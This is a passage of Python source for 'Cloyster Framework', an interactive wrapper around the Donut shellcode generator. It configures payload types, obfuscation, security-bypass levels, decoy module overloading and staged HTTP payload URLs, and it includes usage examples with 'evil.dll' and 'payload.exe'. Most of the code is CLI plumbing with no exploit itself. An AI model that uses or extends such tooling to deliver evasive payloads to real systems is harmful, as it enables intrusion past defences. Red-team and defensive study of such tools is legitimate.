        print(f"\n{Y}[ARCHITECTURES]{X}")
        for aid, adesc in ARCHITECTURES.items():
            print(f"  {G}{aid:>2}{X}. {adesc}")

        # ================= HEADER MODES =================
        print(f"\n{Y}[HEADER MODES]{X}")
        for hid, hdesc in HEADER_MODES.items():
            print(f"  {G}{hid:>2}{X}. {hdesc}")

        # ================= EXAMPLES =================
        print(f"\n{Y}[QUICK EXAMPLES]{X}")
        print(f"""
{G}1. Executável nativo (x64):{X}
   use 9
   set INPUT_FILE calc.exe
   set OUTPUT_FILE calc.bin
   generate

{G}2. .NET Assembly (x64):{X}
   use 10
   set INPUT_FILE myapp.exe
   set PARAMS "--help"
   generate

{G}3. DLL nativa com função exportada:{X}
   use 11
   set INPUT_FILE payload.dll
   set METHOD RunMe
   generate

{G}4. Staged payload (HTTP download):{X}
   use 15
   set INPUT_FILE stage.exe
   set STAGED_URL http://192.168.1.100/payload.bin
   generate

{G}5. Máxima ofuscação (universal):{X}
   use 17
   set INPUT_FILE payload.exe
   set ENTROPY 3
   set COMPRESS 4
   set BYPASS 3
   generate

{G}6. Module Overloading com decoy:{X}
   use 8
   set INPUT_FILE evil.dll
   set DECOY_FILE legit.dll
   generate
""")
        print(f"{C}{'='*70}{X}\n")

    def cmd_info(self, args):
        """Show current module info"""
        if not self.payload_type:
            print_warning("No payload type selected. Use 'use <number>'")
            return
        
        print(f"\n{C}{'='*70}{X}")
        print(f"{B}Payload Module Information{X}")
        print(f"{C}{'='*70}{X}")
        
        pinfo = PAYLOAD_TYPES.get(self.payload_type, {})
        print(f"\n{Y}[MODULE]{X}")
        print(f"  {'Name:':<20} {pinfo.get('name', 'Unknown')}")
        print(f"  {'Description:':<20} {pinfo.get('desc', 'Unknown')}")
        print(f"  {'Type:':<20} {pinfo.get('type', 'Unknown')}")
        print(f"  {'Architecture:':<20} {ARCHITECTURES.get(pinfo.get('arch', '3'), 'Unknown')}")
        
        # Show specific requirements based on payload type
        print(f"\n{Y}[REQUIREMENTS]{X}")
        payload_type = pinfo.get('type', '')
        if payload_type == 'exe':
            print(f"  {'INPUT_FILE:':<20} Required (path to EXE)")
        elif payload_type == 'dotnet':
            print(f"  {'INPUT_FILE:':<20} Required (path to .NET assembly)")
            print(f"  {'CLASS:':<20} Required for DLLs, optional for EXE")
            print(f"  {'METHOD:':<20} Required for DLLs, optional for EXE")
        elif payload_type == 'dll':
            print(f"  {'INPUT_FILE:':<20} Required (path to native DLL)")
            print(f"  {'METHOD:':<20} Required (exported function name)")
        elif payload_type == 'staged':
            print(f"  {'INPUT_FILE:':<20} Required (path to payload)")
            print(f"  {'STAGED_URL:':<20} Required (HTTP server URL)")
        elif payload_type == 'overload':
            print(f"  {'INPUT_FILE:':<20} Required (path to payload)")
            print(f"  {'DECOY_FILE:':<20} Required (decoy module)")
        
        self.show_options()
    
    def cmd_use(self, args):
        """Select payload type"""
        if not args:
            print_error("Usage: use <number>")
            print_info("Available payloads:")
            print(f"\n{C}{'='*60}{X}")
            print(f"{B}x86 Payloads (32-bit){X}")
            for pid, pinfo in PAYLOAD_TYPES.items():
                if pinfo.get('arch') == '1':
                    print(f"  {G}{pid:>2}{X}. {pinfo['name']:<30} - {pinfo['desc']}")
            print(f"\n{C}{'='*60}{X}")
            print(f"{B}x64 Payloads (64-bit){X}")
            for pid, pinfo in PAYLOAD_TYPES.items():
                if pinfo.get('arch') == '2':
                    print(f"  {G}{pid:>2}{X}. {pinfo['name']:<30} - {pinfo['desc']}")
            print(f"\n{C}{'='*60}{X}")
            print(f"{B}Universal Payloads (x86 + x64){X}")
            for pid, pinfo in PAYLOAD_TYPES.items():
                if pinfo.get('arch') == '3':
                    print(f"  {G}{pid:>2}{X}. {pinfo['name']:<30} - {pinfo['desc']}")
            print()
            return
        
        if args in PAYLOAD_TYPES:
            self.payload_type = args
            pinfo = PAYLOAD_TYPES[args]
            print_success(f"Using payload: {pinfo['name']}")
            print_info(f"Architecture: {ARCHITECTURES.get(pinfo.get('arch', '3'), 'Unknown')}")
            self.config["arch"] = pinfo.get('arch', '3')
            
            if pinfo['type'] == 'dll':
                print_warning("Don't forget to set METHOD (exported function name)")
            elif pinfo['type'] == 'staged':
                print_warning("Don't forget to set STAGED_URL")
            elif pinfo['type'] == 'overload':
                print_warning("Don't forget to set DECOY_FILE")
        else:
            print_error(f"Invalid payload type: {args}")
    
    def cmd_show(self, args):
        """Show configuration"""
        if args == "options" or args == "opt":
            self.show_options()
        else:
            print_error("Usage: show options")
    
    def cmd_set(self, args):
        """Set configuration option"""
        parts = args.split(maxsplit=1)
        if len(parts) != 2:
            print_error("Usage: set <OPTION> <value>")
            print_info("Available options:")
            options = [
                "INPUT_FILE", "OUTPUT_FILE", "DECOY_FILE", "MODULE_NAME",
                "ARCH", "ENTROPY", "FORMAT", "COMPRESS", "BYPASS",
                "EXIT_BEHAVIOR", "HEADER_MODE", "PARAMS", "METHOD",
                "CLASS", "APPDOMAIN", "RUNTIME", "UNICODE", "RUN_AS_THREAD",
                "CONTINUE_OFFSET", "STAGED_URL"
            ]
            for opt in sorted(options):
                print(f"  {G}{opt}{X}")
            return
        
        option, value = parts
        option = option.upper()
        
        # Validate values
        if option == "ARCH" and value not in ARCHITECTURES:
            print_error(f"Invalid ARCH. Use: {', '.join(ARCHITECTURES.keys())}")
            return
        elif option == "ENTROPY" and value not in ENTROPY_LEVELS:
            print_error(f"Invalid ENTROPY. Use: {', '.join(ENTROPY_LEVELS.keys())}")
            return
        elif option == "FORMAT" and value not in OUTPUT_FORMATS:
            print_error(f"Invalid FORMAT. Use: {', '.join(OUTPUT_FORMATS.keys())}")
            return
        elif option == "COMPRESS" and value not in COMPRESSION_TYPES:
            print_error(f"Invalid COMPRESS. Use: {', '.join(COMPRESSION_TYPES.keys())}")
            return
        elif option == "BYPASS" and value not in BYPASS_LEVELS:
            print_error(f"Invalid BYPASS. Use: {', '.join(BYPASS_LEVELS.keys())}")
            return
        elif option == "EXIT_BEHAVIOR" and value not in EXIT_BEHAVIORS:
            print_error(f"Invalid EXIT_BEHAVIOR. Use: {', '.join(EXIT_BEHAVIORS.keys())}")
            return
        elif option == "HEADER_MODE" and value not in HEADER_MODES:
            print_error(f"Invalid HEADER_MODE. Use: {', '.join(HEADER_MODES.keys())}")
            return
        
        # Map options to config keys
        option_map = {
            "INPUT_FILE": "input_file",
            "OUTPUT_FILE": "output_file",
            "DECOY_FILE": "decoy_file",
            "MODULE_NAME": "module_name",
            "ARCH": "arch",
            "ENTROPY": "entropy",
            "FORMAT": "format_type",
            "COMPRESS": "compress",
            "BYPASS": "bypass",
            "EXIT_BEHAVIOR": "exit_behavior",
            "HEADER_MODE": "header_mode",
            "PARAMS": "params",
            "METHOD": "method",
            "CLASS": "class_name",
            "APPDOMAIN": "appdomain",
            "RUNTIME": "runtime_version",
            "CONTINUE_OFFSET": "continue_offset",
            "STAGED_URL": "staged_url",
        }
        
        # Boolean options
        if option == "UNICODE":
            self.config["unicode_params"] = value.lower() in ["true", "yes", "1"]
        elif option == "RUN_AS_THREAD":
            self.config["run_as_thread"] = value.lower() in ["true", "yes", "1"]
        elif option in option_map:
            self.config[option_map[option]] = value
        else:
            print_error(f"Unknown option: {option}")
            return
        
        print_success(f"{option} = {value}")
    
    def cmd_unset(self, args):
        """Clear configuration option"""
        if not args:
            print_error("Usage: unset <OPTION>")
            return
        
        option = args.upper()
        option_map = {
            "INPUT_FILE": "input_file",
            "OUTPUT_FILE": "output_file",
            "DECOY_FILE": "decoy_file",
            "MODULE_NAME": "module_name",
            "PARAMS": "params",
            "METHOD": "method",
            "CLASS": "class_name",
            "APPDOMAIN": "appdomain",
            "RUNTIME": "runtime_version",
            "CONTINUE_OFFSET": "continue_offset",
            "STAGED_URL": "staged_url",
        }
        
        if option in option_map:
            self.config[option_map[option]] = None
            print_success(f"{option} cleared")
        elif option == "UNICODE":
            self.config["unicode_params"] = False
            print_success(f"{option} cleared")
        elif option == "RUN_AS_THREAD":
            self.config["run_as_thread"] = False
            print_success(f"{option} cleared")
        else:
            print_error(f"Cannot unset {option}")
    
    def cmd_generate(self, args):
        """Generate shellcode"""
        self.generate()
    
    def cmd_run(self, args):
        """Alias for generate"""
        self.generate()
    
    def cmd_save_config(self, args):
        """Save current configuration"""
        name = args.strip()
        if not name:
            print_error("Usage: save config <name>")
            return
        
        config_path = os.path.join("configs", f"{name}.json")
        config_data = {
            "payload_type": self.payload_type,
            "config": self.config
        }
        
        with open(config_path, "w") as f:
            json.dump(config_data, f, indent=4)
        print_success(f"Configuration saved to: {config_path}")
    
    def cmd_load_config(self, args):
        """Load saved configuration"""
        name = args.strip()
        if not name:
            print_error("Usage: load config <name>")
            return
        
        config_path = os.path.join("configs", f"{name}.json")
        if not os.path.exists(config_path):
            print_error(f"Configuration not found: {name}")
            return
        
        with open(config_path, "r") as f:
            config_data = json.load(f)
        
        self.payload_type = config_data.get("payload_type")
        self.config.update(config_data.get("config", {}))
        print_success(f"Configuration loaded: {name}")
    
    def cmd_list_configs(self, args):
        """List saved configurations"""
        configs = Path("configs").glob("*.json")
        configs = [f.stem for f in configs]
        
        if configs:
            print_info("Saved configurations:")
            for cfg in configs:
                print(f"  {G}*{X} {cfg}")
        else:
            print_info("No saved configurations found")
    
    def cmd_clear(self, args):
        """Clear screen"""
        clear()
        header()
    
    def cmd_pwd(self, args):
        """Show current directory"""
        print(os.getcwd())
    
    def cmd_ls(self, args):
        """List files in directory"""
        path = args if args else "."
        try:
            items = os.listdir(path)
            print(f"\n{C}{'='*60}{X}")
            for item in sorted(items):
                item_path = os.path.join(path, item)
                if os.path.isdir(item_path):
                    print(f"  {C}[DIR]{X}  {item}")
                else:
                    size = os.path.getsize(item_path)
                    print(f"  {G}[FILE]{X} {item:<40} {size:>10} bytes")
            print()
        except Exception as e:
            print_error(f"Cannot list directory: {e}")
    
    def cmd_cd(self, args):
        """Change directory"""
        if not args:
            return
        try:
            os.chdir(args)
            print_success(f"Changed to: {os.getcwd()}")
        except Exception as e:
            print_error(f"Cannot change directory: {e}")
    
    def cmd_plugin(self, args):
        """Copy file to plugin directory"""
        if not args:
            print_error("Usage: plugin <file_path>")
            return
        
        if not os.path.exists(args):
            print_error(f"File not found: {args}")
            return
        
        dest = os.path.join("plugin", os.path.basename(args))
        try:
            shutil.copy2(args, dest)
            print_success(f"Copied to: {dest}")
        except Exception as e:
            print_error(f"Failed to copy: {e}")
    
    def cmd_history(self, args):
        """Show command history"""
        if readline_available and readline:
            hist_len = readline.get_current_history_length()
            for i in range(1, min(hist_len, 50) + 1):
                try:
                    cmd = readline.get_history_item(i)
                    if cmd:
                        print(f"{G}{i:3}{X} {cmd}")
                except:
                    pass
        else:
            for i, cmd in enumerate(self.history[-50:], 1):
                print(f"{G}{i:3}{X} {cmd}")
    
    def cmd_exit(self, args):
        """Exit framework"""
        self._save_history()
        print_info("Exiting Cloyster Framework...")
        sys.exit(0)
    
    def run(self):
        """Main loop"""
        header()
        print_info("Cloyster Framework initialized")
        
        if readline_available:
            print_success("Readline loaded (command history + tab completion enabled)")
        else:
            print_warning("Readline not available. Install pyreadline3 for better CLI experience")
            print_info("  pip install pyreadline3")

        print_info(f"Payloads loaded: {len(PAYLOAD_TYPES)}")
        print_info(f"Output formats: {len(OUTPUT_FORMATS)}")
        print_info("Type 'help' for available commands")
        print_info("Use 'use <number>' to select a payload")
        print(f"{R}[COMMAND]: menu | show options | use {X}")
        print()
        
        while True:
            try:
                cmd_input = input(self._get_prompt()).strip()
                if not cmd_input:
                    continue
                
                self.history.append(cmd_input)
                
                parts = cmd_input.split(maxsplit=1)
                cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""
                
                # Command routing
                if cmd in ["help", "?"]:
                    self.cmd_help(args)
                elif cmd == "menu":
                    self.cmd_menu(args)
                elif cmd == "info":
                    self.cmd_info(args)
                elif cmd == "use":
                    self.cmd_use(args)
                elif cmd == "show":
                    self.cmd_show(args)
                elif cmd == "set":
                    self.cmd_set(args)
                elif cmd == "unset":
                    self.cmd_unset(args)
                elif cmd in ["generate", "gen"]:
                    self.cmd_generate(args)
                elif cmd in ["run", "exec"]:
                    self.cmd_run(args)
                elif cmd == "save" and args.startswith("config"):
                    self.cmd_save_config(args.replace("config", "").strip())
                elif cmd == "load" and args.startswith("config"):
                    self.cmd_load_config(args.replace("config", "").strip())
                elif cmd == "list" and args.startswith("configs"):
                    self.cmd_list_configs(args)
                elif cmd in ["clear", "cls"]:
                    self.cmd_clear(args)
                    print_info(f"Payloads loaded: {len(PAYLOAD_TYPES)}")
                    print_info(f"Output formats: {len(OUTPUT_FORMATS)}")
                    print_info("Type 'help' for available commands")
                    print_info("Use 'use <number>' to select a payload")
                    print(f"{R}[COMMAND]: menu | show options | use {X}")
                    print("")
                elif cmd == "pwd":
                    self.cmd_pwd(args)
                elif cmd in ["ls", "dir"]:
                    self.cmd_ls(args)
                elif cmd == "cd":
                    self.cmd_cd(args)
                elif cmd == "plugin":
                    self.cmd_plugin(args)
                elif cmd == "history":
                    self.cmd_history(args)
                elif cmd in ["exit", "quit"]:
                    self.cmd_exit(args)
                else:
                    print_error(f"Unknown command: {cmd}. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                print(f"\n{Y}[!] Use 'exit' to quit{X}")
                continue
            except EOFError:
                print()
                self.cmd_exit("")

# MAIN 
# ════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    if not os.path.exists("donut.exe"):
        print_error("donut.exe not found in current directory!")
        print_info("Please download Donut from: https://github.com/TheWover/donut/releases")
        print_info("Place donut.exe in the same directory as this script")
        sys.exit(1)
    
    framework = CloysterFramework()
    framework.run()
